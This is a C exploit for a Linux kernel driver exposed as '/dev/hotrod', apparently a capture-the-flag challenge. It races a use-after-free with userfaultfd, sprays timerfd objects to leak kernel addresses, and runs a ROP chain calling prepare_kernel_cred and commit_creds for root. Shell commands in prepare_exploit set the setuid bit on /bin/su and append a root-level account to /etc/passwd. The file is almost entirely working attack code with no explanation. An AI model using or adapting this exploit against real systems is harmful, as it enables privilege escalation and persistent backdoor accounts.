#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <stdint.h>
#include <poll.h>
#include <errno.h>
#include <assert.h>
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>      /* Definition of SYS_* constants */
#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <sys/types.h>
#include <sys/timerfd.h>

#define ALLOC 	0xBAADC0DE
#define FREE	0xC001C0DE
#define EDIT	0xDEADC0DE
#define SHOW 	0x1337C0DE

#define PAGE_SIZE 0x1000
#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                       } while (0)

typedef struct hotrod_data
{
	size_t size;
	unsigned char* buffer;
}hotrod_data;


// global var
int fd;
static unsigned char buffer[0xf0];
char* map_addr = NULL;
unsigned long povit_pointer;

unsigned long user_cs, user_rflags, user_sp, user_ss, user_rip;
unsigned long kernel_addr;

void open_hotrod()
{
	fd = open("/dev/hotrod", 0);
	if(fd < 0)
	{
		puts("[!] Failed to open device!");
		exit(-1);
	}
	puts("[*] Opened device.");
	return;
}


void hotrod_alloc(size_t size)
{
	ioctl(fd, ALLOC, size);
}

void hotrod_free()
{
	ioctl(fd, FREE, NULL);
}


void hotrod_edit(size_t size, unsigned char* buffer)
{
	hotrod_data* h = malloc(0x10);
	h->size = size;
	h->buffer = buffer;

	ioctl(fd, EDIT, h);
}


void hotrod_show(size_t size, unsigned char* buffer)
{
	hotrod_data* h = malloc(0x10);
	h->size = size;
	h->buffer = buffer;

	ioctl(fd, SHOW, h);
}


void create_timer(int delete)
{
	int tid = 0;
	struct itimerspec its;

	its.it_interval.tv_sec = 0;
	its.it_interval.tv_nsec = 0;
	its.it_value.tv_sec = 10;
	its.it_value.tv_nsec = 0;


	tid = timerfd_create(CLOCK_REALTIME, 0);
	if(!tid){
		puts("Error iin timerfd_create");
		exit(-1);
	}

	timerfd_settime(tid, 0, &its, NULL);

	if(delete)
	{
		close(tid);
		sleep(1);	//wait for kree_rcu to kfree the timer struct

		puts("[*] Create A timer and delete it done!");
	}

	return;
}

void hexdump(unsigned char *buff, unsigned long size)
{
    int i,j;

    for (i = 0; i < size/8; i++)
    {
      if ((i % 2) == 0)
      {
        if (i != 0)
            printf("  \n");

        printf("  %04x  ", i*8);
      }

      unsigned long ptr = ((unsigned long *)(buff))[i];
      printf("0x%016lx", ptr);
      printf("    ");

    }
    printf("\n");
}

void modify_modprobe()
{
	/*
	puts("modify");
	int fd;
	fd = open("/proc/sys/kernel/modprobe", O_WRONLY | O_TRUNC);

	write(fd, "/home/user/adduser", 18);

	close(fd);
	*/
	return ;
}

static void* handler(void* arg)
{
	static struct uffd_msg msg;  
	struct uffdio_copy uffd_copy;

	unsigned long uffd = (unsigned long) arg;
	puts("[*] Handler started !");

	// in loop to wait pagefault
	for(;;)
	{
		// See what poll() tells us about the userfaultfd. 
		struct pollfd pollfd;
		int nready, nread;
		pollfd.fd = uffd;
		pollfd.events = POLLIN;
		nready = poll(&pollfd, 1, -1);

		if (nready == -1)
		       errExit("poll");


		nread = read(uffd, &msg, sizeof(msg));
		if (nread == 0) {
			printf("EOF on userfaultfd!\n");
			exit(EXIT_FAILURE);
		}

		char* fault_address = msg.arg.pagefault.address;
		if ((msg.event != UFFD_EVENT_PAGEFAULT) || (fault_address != map_addr)) {
			puts("[-] Unexpected Fault!");
			exit(-1);
		}


		printf("[*] Page Fualt At address: 0x%lx\n", fault_address);
		printf("[*] Mapped address: 0x%lx\n", map_addr);
		/*
		UAF here
		*/
		// free
		hotrod_free();
		//create second timer and don't free
		create_timer(0);

		void* fake_stack = mmap((void*)0xccaa0000, PAGE_SIZE*4, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
		
		((unsigned long*)(buffer))[0x0] = (unsigned long)(fake_stack + 0x400);
		((unsigned long*)(buffer))[0x3] = 0x0000000000000001;
		((unsigned long*)(buffer))[0x4] = 0x0000000000000001;
		//((unsigned long*)(buffer))[0x5] = 0xdeadbeefdeadbeef;
		((unsigned long*)(buffer))[0x5] = povit_pointer;


		sleep(1.8);


		unsigned long* rop = (unsigned long*)(fake_stack + 0x400);

		// commit_creds
		*rop++ = kernel_addr + (0xb689d);	// pop rdi; ret
		*rop++ = 0;
		*rop++ = kernel_addr + 0x53680; 		// prepare_kernel_cred
		*rop++ = kernel_addr + (0xffa5a);	// mov rdi, rax; call 0x2d1350; mov rax, -0x16; pop rbp; ret;
		*rop++ = 0;
		*rop++ = kernel_addr + (0x537d0);		// commit_creds

		*rop++ = kernel_addr + (0x200cb0 + 0x35);		//kpti_trampoline
		*rop++ = 0x0;
		*rop++ = 0x0;
		*rop++ = modify_modprobe;
		*rop++ = user_cs;
		*rop++ = user_rflags;
		*rop++ = user_sp;
		*rop++ = user_ss;

		// prepare_kernel_cred

		printf("[*] From address: 0x%lx\n", buffer);

		uffd_copy.dst = map_addr;	
		uffd_copy.src = buffer;							
		uffd_copy.len = PAGE_SIZE;
		uffd_copy.mode = 0;
		uffd_copy.copy = 0;

		if(ioctl(uffd, UFFDIO_COPY, &uffd_copy) == -1)
		{
			errExit("UFFDIO_COPY");
			exit(-1);
		}
		break;
	}

	return 0;
}


unsigned long register_userfault(unsigned long fault_page, unsigned long fault_page_length)
{

	struct uffdio_api uapi;
	struct uffdio_register ur;

	// 1. create a userfaultfd
	unsigned long uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	uapi.api = UFFD_API;
	uapi.features = 0;

	if (ioctl(uffd, UFFDIO_API, &uapi) == -1)
	    errExit("ioctl-UFFDIO_API");

	// 2. register memory area
	ur.range.start = fault_page;
	ur.range.len = fault_page_length;
	ur.mode = UFFDIO_REGISTER_MODE_MISSING;
	if(ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
		errExit("ioctl-UFFDIO_REGISTER");

	return uffd;
}

void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
        );
    puts("[*] Saved state");
}

void prepare_exploit()
{
  system("echo -e '\xdd\xdd\xdd\xdd\xdd\xdd' > /home/user/asd");
  system("chmod +x /home/user/asd");
  system("echo '#!/bin/sh' > /home/user/x");
  system("echo 'chmod +s /bin/su' >> /home/user/x");
  system("echo 'echo \"asd:12prjwbMKCxIE:0:0:asd:/root:/bin/sh\" >> /etc/passwd' >> /home/user/x");
  system("chmod +x /home/user/x");
}


int main()
{


	save_state();

	unsigned long leak, heap_addr;
	open_hotrod();
	create_timer(1);

	hotrod_alloc(0xf0);
	hotrod_show(0xf0, buffer);


	leak = ((unsigned long*)(buffer))[0x5];
	kernel_addr = leak - 0x102a00;
	heap_addr = ((unsigned long*)buffer)[0x0];

	povit_pointer = kernel_addr + 0x27b86;	// mov esp, dword ptr [rdi]; lea rax, [rax + rsi*8]; ret; 


	printf("[*] Leak timerfd_proc address: 0x%lx\n", leak);
	printf("[*] Leak kernel_address: 0x%lx\n", kernel_addr);
	printf("[*] Leak heap_address: 0x%lx\n", heap_addr);

	map_addr = (char *) mmap(0xdead0000, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);



	unsigned long uffd = register_userfault(map_addr, PAGE_SIZE);
	pthread_t thr;

	// create handler thread
	pthread_create(&thr, NULL, handler, (void*)uffd);

	// Trigger PageFault
	hotrod_edit(0xf0, map_addr);

	// page handler
	pthread_join(thr, NULL);


	return 0;
}